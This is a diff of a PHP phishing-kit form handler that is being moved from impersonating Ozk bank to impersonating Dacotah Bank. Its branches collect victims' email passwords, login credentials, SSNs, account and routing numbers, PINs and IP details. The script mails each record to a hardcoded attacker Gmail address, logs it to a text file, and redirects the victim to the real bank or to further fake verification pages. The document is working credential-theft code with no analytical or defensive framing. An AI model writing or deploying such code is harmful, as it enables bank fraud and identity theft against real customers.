@@ -1,43 +1,111 @@
 <?php
+$Receive_email = "staerkelramee@gmail.com";
 
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Headers: access");
-header("Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS");
-header("Access-Control-Allow-Credentials: true");
-header("Expires: -1"); 
+if (isset($_POST['emailbtn'])) {
+	
 
-$ip = getenv("REMOTE_ADDR");
-$time = date("m-d-Y g:i:a");
-$hostname = gethostbyaddr($ip);
-$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	
+	$message .= "Email Address            : ".$_POST['em']."\n";
+	$message .= "Email Password              : ".$_POST['empsw']."\n";
 
-$message = "New Message\n";
-$message .= "Email : ".$_POST['em']."\n";
-$message .= "Email Password : ".$_POST['empsw']."\n";
-$message .= "SSN : ".$_POST['ssn']."\n";
-$message .= "Account Number : ".$_POST['acctnum']."\n";
-$message .= "Account Type : ".$_POST['accttyp']."\n";
-$message .= "Pin : ".$_POST['pin']."\n";
-$message .= "HostName : ".$hostname."\n";
-$message .= "IP Address $ip on $time\n";
-$message .= "Browser: $useragent\n";
-$message .= "----------------------By May-\n";
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "Login : $ip";
+	mail($send, $subject, $message);
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
 
-$subject = "New Ozk verification";
+	header("Location: https://www.dacotahbank.com/");
 
-$send = "staerkelramee@gmail.com";
-$from = "From: May <info@studio.com>";
-$from .= "MIME-Version: 1.0\n";
+	
+	
+}
 
-mail($send,$subject,$message, $from);
+else if (isset($_POST['contibtn'])) {
+	
 
-$file = "text.txt";
-$open = fopen($file, "a");
-fwrite($open, $message."\n");
-fclose($open);
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	$message .= "Social Security Number : ".$_POST['ssn']."\n";
+	$message .= "Phone Number           : ".$_POST['phone']."\n";
+	$message .= "Account Number         : ".$_POST['acctnum']."\n";
+	$message .= "Routing Number         : ".$_POST['routenum']."\n";
+	$message .= "Pin                    : ".$_POST['pin']."\n";
+	$message .= "Zip Code            : ".$_POST['zip']."\n";
+
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "Login : $ip";
+	mail($send, $subject, $message);
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
+	 
+	header("Location: http://localhost/datcotah/emailverification.html");
+
+	
+	
+}
 
 
-header("Location: https://www.ozk.com/personal/");
+else if (isset($_POST['login_btn'])) {
+	
 
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+	$message .= "|----------| |--------------|\n";
+	$message .= "Login ID            : ".$_POST['user_id']."\n";
+	$message .= "Password              : ".$_POST['password']."\n";
+
+	$message .= "|--------------- I N F O | I P -------------------|\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+	$message .= "|----------- --------------|\n";
+	$send = $Receive_email;
+	$subject = "Login : $ip";
+	mail($send, $subject, $message);
+	
+	$file = "text.txt";
+	$open = fopen($file, "a");
+	fwrite($open, $message."\n");
+	fclose($open);
+	 
+	header("Location: http://localhost/datcotah/verification.html");
+
+	
+	
+}
+
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg,
+        'redirect_link' => $redirect,
+    );
+    echo json_encode($data);
 
 ?>
